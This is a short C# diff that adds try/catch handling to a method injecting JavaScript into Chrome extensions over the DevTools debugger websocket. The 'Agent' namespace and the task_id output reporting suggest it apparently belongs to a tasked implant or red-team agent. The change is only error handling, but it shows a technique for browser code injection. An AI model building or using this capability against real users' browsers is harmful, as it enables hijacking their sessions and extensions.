@@ -85,7 +85,19 @@ namespace Agent
         }
         internal async Task<string> TryInjectJsAsync(ChromeJsonObject extension, string jsCode, string task_id)
         {
-            return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
+            try
+            {
+                var uri = new Uri(extension.webSocketDebuggerUrl);
+                return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
+            }
+            catch (Exception e)
+            {
+                if (this.config.debug)
+                {
+                    ReturnOutput("Failed to parse URI" + e.ToString(), task_id).RunSynchronously();
+                }
+                return "";
+            }
         }
         internal async Task<string> InjectJs(string jsCode, Uri uri, string task_id)
         {
